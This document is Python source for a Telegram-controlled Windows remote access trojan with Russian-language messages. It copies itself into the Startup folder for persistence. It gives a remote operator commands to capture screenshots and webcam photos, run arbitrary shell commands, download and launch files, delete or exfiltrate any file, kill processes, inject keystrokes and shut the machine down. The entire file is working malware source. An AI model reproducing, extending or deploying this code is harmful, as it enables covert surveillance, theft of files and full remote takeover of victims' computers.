import telebot
import pyautogui
import os
import time
import pyscreeze
import PIL
import webbrowser
import random
import subprocess
import locale
import cv2
import win32gui
import win32con
import win32api
import psutil
import keyboard
import clipboard
from pygame import mixer
import requests
import sys
import shutil

pyautogui.FAILSAFE = True

bot = telebot.TeleBot('')
adminid = ()
filenamebase = os.path.basename(sys.executable)
current_file  = sys.executable
usename = win32api.GetUserName()
srcautostart = f'C:\\Users\\{usename}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filenamebase}'
try:
    if current_file != srcautostart:
        shutil.copy(sys.executable, srcautostart)
        os.startfile(srcautostart)
        os._exit(0)
except: pass

while True:
    try:
        class scr:
            scr1 = None
            scr2 = None
            def set_data(self, scr1):
                self.scr1 = scr1
            def set_data1(self, scr2):
                self.scr2 = scr2

        class nam:
            oldname = None
            newname = None

            def set_data(self, oldname):
                self.oldname = oldname

            def set_data1(self, newname):
                self.newname = newname

        scrmove = scr()
        renamefi = nam()


        bot.send_message(adminid, "Компьютер включен.")

        @bot.message_handler(func=lambda message: message.from_user.id != adminid)
        def non(message):
            bot.send_message(message.chat.id, 'Пользование запрещено')

        @bot.message_handler(commands=['screenshot'])
        def scr(message):
            try:
                filename = f"{time.time()}.jpg"
                try:
                    os.mkdir('C:\\pyvdonw')
                except: pass
                bot.send_message(message.chat.id, time.ctime(time.time()))
                pyscreeze.screenshot(f'C:\\pyvdonw\\{filename}')

                with open(f'C:\\pyvdonw\\{filename}', "rb") as img:
                    bot.send_photo(message.chat.id, img)
                os.remove(f'C:\\pyvdonw\\{filename}')
            except Exception as e: bot.reply_to(message, e)
        @bot.message_handler(commands=['pcoff'])
        def off(message):
            try:
                bot.send_message(message.chat.id, 'Компьютер выключен')
                os.system("shutdown -s -t 01")
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['message_inf'])
        def msg1(message):
            try:
                nc = message.text.replace("/message_inf ", "")
                if nc != '/message_inf ':
                    win32gui.MessageBox(win32gui.GetForegroundWindow(), nc, 'Ошибка', win32con.MB_OK | win32con.MB_ICONINFORMATION)
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['message_war'])
        def msg1(message):
            try:
                nc = message.text.replace("/message_war ", "")
                if nc != '/message_war ':
                    win32gui.MessageBox(win32gui.GetForegroundWindow(), nc, 'Ошибка', win32con.MB_OK | win32con.MB_ICONWARNING)
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['wincl'])
        def wc(message):
            try:
                keyboard.press_and_release('alt+f4')
                bot.send_message(message.chat.id, 'Окно закрыто')
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['leave'])
        def lv(message):
            try:
                bot.send_message(message.chat.id, 'Выход из профиля')
                pyautogui.hotkey('win', 'l')
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['link'])
        def lin1(message):
            try:
                nc = message.text.replace("/link ", "")
                if nc != '/link ':
                    webbrowser.open(nc)
                    bot.send_message(message.chat.id, 'Ссылка открыта')

            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['f'])
        def lin1(message):
            try:
                bot.send_message(message.chat.id,
                                """Функции:
    /version - версия программы
    /screenshot - скриншот
    /pcoff - выключение пк
    /message_inf (текст) - отправка текста на экран с иконкой информации
    /message_war (текст) - отправка текста на экран с иконкой ошибки
    /wincl - закрытие активного окна
    /leave - выйти из профиля
    /link (текст) - открытие ссылки
    /randommouse - рандомное движение мыши
    /upload - скачивание файла (до 50мб!!)
    /uploadrequest - скачивнаие файла с облака (ввести команду, url, имя файла)
    /startfile (текст) - запуск файла (абсолютный путь)
    /move - перемещение файла (без замены)
    /remove (текст) - удаление файла (абсолютный путь)
    /rename (текст) - переименование файла
    /listdir (текст) - узнать файлы в директории
    /cmd (текст) - коммандная строка
    /getcwd - путь до исполняемого файла
    /webcam - фото с вебки (тестовая функция)
    /getusername - получить имя пользователя
    /processend (текст) - завершение процесса
    /allprocess - показать все активные процессы
    /press_button (текст) - комбинация горячих клавиш
    /send (текст) - отправка файла в чат по абсолютному пути
    /audio - запуск аудиофайла (не гс!!!!)
    /stop - остановка аудифайла
    /clipboard (текст) - вставка текста""")
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['randommouse'])
        def rm(message):
            try:
                pyautogui.moveTo(random.uniform(0, 1920),random.uniform(0, 1080), 2)
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['upload'])
        def u1(message):
            try:
                mesg = bot.send_message(message.chat.id, 'Отправьте файл')
                bot.register_next_step_handler(mesg, u2)
            except Exception as e: bot.reply_to(message, e)
        def u2(message):
            try:
                try:
                    os.mkdir('C:\\pyvdonw')
                except: pass
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                src = 'C:\\pyvdonw\\' + message.document.file_name
                with open(src, 'wb') as new_file:
                    new_file.write(downloaded_file)
                    bot.reply_to(message, f'Сохранен в C:\\pyvdonw\\{message.document.file_name}')
            except Exception as e:  bot.reply_to(message, e)

        @bot.message_handler(commands=['startfile'])
        def sf1(message):
            try:
                nc = message.text.replace('/startfile ','')
                if nc != '/startfile ':
                    print(nc)
                    os.startfile(nc)
                    bot.send_message(message.chat.id,f'Файл {nc} запущен')
                else: pass
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['move'])
        def rep(message):
            try:
                inp = bot.send_message(message.chat.id, 'Введите абсолютный путь переносимого файла')
                bot.register_next_step_handler(inp, rep2)
            except Exception as e: bot.reply_to(message, e)

        def rep2(message):
            try:
                scrmove.set_data(message.text)
                inp = bot.send_message(message.chat.id, 'Введите абсолютный путь для переноса (с именем файла)')
                bot.register_next_step_handler(inp, rep3)
            except Exception as e: bot.reply_to(message, e)

        def rep3(message):
            try:
                scrmove.set_data1(message.text)
                win32api.MoveFile(scrmove.scr1, scrmove.scr2)
                bot.send_message(message.chat.id, f'Файл по пути: {scrmove.scr1} перемещен в {scrmove.scr2}' )
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['remove'])
        def rem(message):
            try:
                nc = message.text.replace("/remove ", "")
                if nc != '/remove ':
                    os.remove(nc)
                    bot.send_message(message.chat.id, f'Файл по пути {nc} удален')
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['rename'])
        def ren(message):
            try:
                nc = message.text.replace("/rename ", "")
                if nc != '/rename ':
                    renamefi.set_data(nc)
                    inp = bot.send_message(message.chat.id, 'Введите новое имя файла (полный путь)')
                    bot.register_next_step_handler(inp, ren2)
            except Exception as e: bot.reply_to(message, e)

        def ren2(message):
            try:
                renamefi.set_data1(message.text)
                os.rename(renamefi.oldname, renamefi.newname)
                bot.send_message(message.chat.id, f'Файл по пути: {renamefi.oldname} переименован в {renamefi.newname}')
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['listdir'])
        def dir(message):
            try:
                nc = message.text.replace("/listdir ", "")
                if nc != '/listdir ':
                    dir = os.listdir(nc)
                    scr = nc
                    coment = f'Файлы в каталоге {scr} :'
                    res = [coment]
                    for i in dir:
                        res.append(i)
                    bot.send_message(message.chat.id, '\n'.join(res))
            except Exception as e: bot.send_message(message, e)
        @bot.message_handler(commands=['cmd'])
        def cm(message):
            try:
                nc = message.text.replace("/cmd ", "")
                if nc != '/cmd ':
                    locale.setlocale(locale.LC_ALL, 'ru_RU.UTF-8')
                    result = subprocess.run(nc, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                            encoding='cp866')
                    output_message = f"Вывод:\n{result.stdout}\nОшибка:\n{result.stderr}"
                    bot.send_message(message.chat.id, output_message)
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['getcwd'])
        def lin1(message):
            try:
                bot.send_message(message.chat.id, f'Путь до исполняемого файла: {sys.executable}')
            except Exception as e:
                bot.reply_to(message, f'Ошибка: {e}')

        @bot.message_handler(commands=["webcam"])
        def webcam(message):
            try:
                try:
                    os.mkdir('C:\\pyvdonw')
                except: pass
                filename = "C:\\pyvdonw\\cam.jpg"
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cv2.imwrite(filename, frame)
                cap.release()
                with open(filename, "rb") as img:
                    bot.send_photo(message.chat.id, img)
                os.remove(filename)
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['getusername'])
        def us1(message):
            try:
                a = win32api.GetUserName()
                bot.send_message(message.chat.id, f'Имя пользователя -- {a}')
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['processend'])
        def pe1 (message):
            try:
                nc = message.text.replace("/processend ", "")
                if nc != '/processend ':
                    os.system(f'taskkill /f /im {nc}')
                    bot.send_message(message.chat.id, f'Процесс {message.text} закрыт')
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['allprocess'])
        def p1 (message):
            try:
                b = os.popen('wmic process get description').read()
                b = b.split()
                a = []
                for i in b:
                    if i != 'svchost.exe':
                        a.append(i)
                b = sorted(a)

                bot.send_message(message.chat.id, f'Запущенные программы: {'\n'.join(b)}')
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['press_button'])
        def press_buttons(message):
            try:
                new_command = message.text.replace("/press_button ", "")
                if new_command != '/press_button ':
                    keyboard.press_and_release(new_command)
                    bot.reply_to(message, f"Кнопка(и) {new_command} была нажата(ы)")
            except Exception as e: bot.reply_to(message, str(e))

        @bot.message_handler(commands=['send'])
        def pe1 (message):
            try:
                nc = message.text.replace("/send ", "")
                if nc != '/send ':
                    bot.send_document(message.chat.id, open(nc, 'rb'), caption=f'Файл по пути {nc}')
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['audio'])
        def a1(message):
            try:
                mesg = bot.send_message(message.chat.id, 'Отправьте аудио')
                bot.register_next_step_handler(mesg, a2)
            except Exception as e: bot.reply_to(message, e)
        def a2(message):
            try:
                try:
                    os.mkdir('C:\\pyvdonw')
                except: pass
                file_info = bot.get_file(message.audio.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                src = 'C:\\pyvdonw\\audio.mp3'
                with open(src, 'wb') as new_file:
                    new_file.write(downloaded_file)
                mixer.init()
                mixer.music.load(src)
                mixer.music.set_volume(1)
                bot.send_message(message.chat.id, 'Аудио запущено')
                mixer.music.play()
                while mixer.music.get_busy() != False:
                    if mixer.music.get_busy() == False:
                        mixer.music.unload()
                try:
                    os.remove(src)
                except: pass
            except Exception as e:  bot.reply_to(message, e)
            mixer.music.unload()
            os.remove('C:\\pyvdonw\\audio.mp3')

        @bot.message_handler(commands=['stop'])
        def s(message):
            try:
                mixer.music.stop()
                mixer.music.unload()
                bot.send_message(message.chat.id, 'Аудио остановлено')
                try:
                    os.remove('C:\\pyvdonw\\audio.mp3 ')
                except: pass
            except Exception as e: bot.reply_to(message, e)

        @bot.message_handler(commands=['uploadrequest'])
        def upload(message):
            try:
                os.mkdir('C:\\pyvdonw')
            except: pass
            try:
                name = message.text.split(' ')
                print(name)
                upl = name[1]
                filename = name[2]
                if upl != "/uploadrequest ":
                    response = requests.get(upl)
                    if response.status_code == 200:
                        with open(f'C:\\pyvdonw\\{filename}', 'wb') as file:
                            file.write(response.content)
                        bot.send_message(message.chat.id, f'Файл загружен по пути C:\\pyvdonw\\{filename}')
                else: pass
            except Exception as e: bot.reply_to(message, str(e))

        @bot.message_handler(commands=['clipboard'])
        def clip (message):
            try:
                nc = message.text.replace("/clipboard ", "")
                if nc != '/clipboard ':
                    clipboard.copy(nc)
                    keyboard.press_and_release('ctrl+v')
                    bot.send_message(message.chat.id, f'Текст ( {nc} ) вставлен')
            except Exception as e: bot.reply_to(message, e)



        @bot.message_handler(commands=['version'])
        def clip (message):
            bot.send_message(message.chat.id, 'Версия: 1.1')
    except: pass
    
    while True:
        try:
            bot.polling(none_stop=True)
        except:
            bot.polling(none_stop=True)
